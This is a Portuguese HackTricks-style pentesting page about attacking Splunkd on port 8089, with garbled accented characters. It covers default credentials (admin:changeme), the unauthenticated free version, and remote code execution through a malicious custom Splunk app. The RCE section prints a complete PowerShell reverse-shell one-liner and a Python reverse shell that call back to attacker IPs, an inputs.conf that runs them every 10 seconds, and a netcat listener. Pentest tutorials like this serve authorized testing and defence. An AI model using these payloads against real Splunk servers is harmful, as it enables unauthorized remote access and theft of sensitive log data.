# 8089 - Pentesting Splunkd

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## **Informa√ß√µes B√°sicas**

Splunk √© uma **ferramenta de an√°lise de logs** que desempenha um papel crucial na **coleta, an√°lise e visualiza√ß√£o de dados**. Embora seu prop√≥sito inicial n√£o fosse servir como uma ferramenta de **SIEM (Security Information and Event Management)**, ganhou popularidade no √¢mbito do **monitoramento de seguran√ßa** e **an√°lise de neg√≥cios**.

As implanta√ß√µes do Splunk s√£o frequentemente utilizadas para armazenar **dados sens√≠veis** e podem servir como uma **fonte valiosa de informa√ß√µes** para poss√≠veis atacantes se conseguirem comprometer o sistema.
**Porta padr√£o:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
O **servidor web Splunk √© executado por padr√£o na porta 8000**.
{% endhint %}

## Enumera√ß√£o

### Vers√£o Gratuita

O teste do Splunk Enterprise se converte em uma **vers√£o gratuita ap√≥s 60 dias**, a qual **n√£o requer autentica√ß√£o**. N√£o √© incomum os administradores de sistema instalarem um teste do Splunk para test√°-lo, o qual √© **posteriormente esquecido**. Isso automaticamente converte para a vers√£o gratuita que n√£o possui nenhum tipo de autentica√ß√£o, introduzindo uma vulnerabilidade no ambiente. Algumas organiza√ß√µes podem optar pela vers√£o gratuita devido a restri√ß√µes or√ßament√°rias, sem compreender totalmente as implica√ß√µes de n√£o ter gerenciamento de usu√°rio/papel.

### Credenciais Padr√£o

Em vers√µes mais antigas do Splunk, as credenciais padr√£o s√£o **`admin:changeme`**, as quais s√£o convenientemente exibidas na p√°gina de login.\
No entanto, **a vers√£o mais recente do Splunk** define **credenciais** **durante o processo de instala√ß√£o**. Se as credenciais padr√£o n√£o funcionarem, vale a pena verificar por senhas fracas comuns como `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

### Obter Informa√ß√µes

Depois de fazer login no Splunk, podemos **navegar pelos dados**, executar **relat√≥rios**, criar **pain√©is**, **instalar aplicativos** da biblioteca Splunkbase e instalar aplicativos personalizados.\
Voc√™ tamb√©m pode executar c√≥digo: o Splunk tem v√°rias maneiras de **executar c√≥digo**, como aplicativos Django do lado do servidor, pontos finais REST, entradas scriptadas e scripts de alerta. Um m√©todo comum de obter execu√ß√£o de c√≥digo remoto em um servidor Splunk √© atrav√©s do uso de uma entrada scriptada.

Al√©m disso, como o Splunk pode ser instalado em hosts Windows ou Linux, entradas scriptadas podem ser criadas para executar scripts Bash, PowerShell ou Batch.

### Shodan

* `Constru√ß√£o do Splunk`

## RCE

### Criar Aplicativo Personalizado

Um aplicativo personalizado pode executar **scripts Python, Batch, Bash ou PowerShell**.\
Observe que o **Splunk vem com Python instalado**, ent√£o mesmo em sistemas **Windows** voc√™ poder√° executar c√≥digo Python.

Voc√™ pode usar [**este**](https://github.com/0xjpuff/reverse\_shell\_splunk) pacote Splunk para nos ajudar. O diret√≥rio **`bin`** neste reposit√≥rio tem exemplos para [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) e [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Vamos seguir isso passo a passo.

Para conseguir isso, primeiro precisamos criar um aplicativo Splunk personalizado usando a seguinte estrutura de diret√≥rio:
```shell-session
tree splunk_shell/

splunk_shell/
‚îú‚îÄ‚îÄ bin
‚îî‚îÄ‚îÄ default
```
O diret√≥rio **`bin`** conter√° quaisquer **scripts que pretendemos executar** (neste caso, um shell reverso **PowerShell**), e o diret√≥rio padr√£o ter√° nosso arquivo `inputs.conf`. Nosso shell reverso ser√° um **PowerShell de uma linha:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
O arquivo [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) informa ao Splunk **qual script executar** e quaisquer outras condi√ß√µes. Aqui definimos o aplicativo como habilitado e dizemos ao Splunk para executar o script a cada 10 segundos. O intervalo √© sempre em segundos, e a entrada (script) s√≥ ser√° executada se essa configura√ß√£o estiver presente.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Precisamos do arquivo `.bat`, que ser√° executado quando a aplica√ß√£o for implantada e executar√° o comando PowerShell.

O pr√≥ximo passo √© escolher `Instalar aplicativo a partir do arquivo` e fazer o upload da aplica√ß√£o.

<figure><img src="../.gitbook/assets/image (4) (5) (1).png" alt=""><figcaption></figcaption></figure>

Antes de fazer o upload do aplicativo personalizado malicioso, vamos iniciar um ouvinte usando Netcat ou [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
Na p√°gina `Upload app`, clique em procurar, escolha o tarball que criamos anteriormente e clique em `Upload`. Assim que **fazemos o upload do aplicativo**, um **shell reverso √© recebido** e o status do aplicativo ser√° automaticamente alterado para `Enabled`.

#### Linux

Se estiv√©ssemos lidando com um **host Linux**, precisar√≠amos **editar o script Python `rev.py`** antes de criar o tarball e fazer o upload do aplicativo malicioso personalizado. O restante do processo seria o mesmo e obter√≠amos uma conex√£o de shell reverso em nosso ouvinte Netcat e estar√≠amos prontos para come√ßar.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Escalada de Privil√©gios

Na p√°gina a seguir, voc√™ pode encontrar uma explica√ß√£o de como este servi√ßo pode ser abusado para escalar privil√©gios e obter persist√™ncia:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
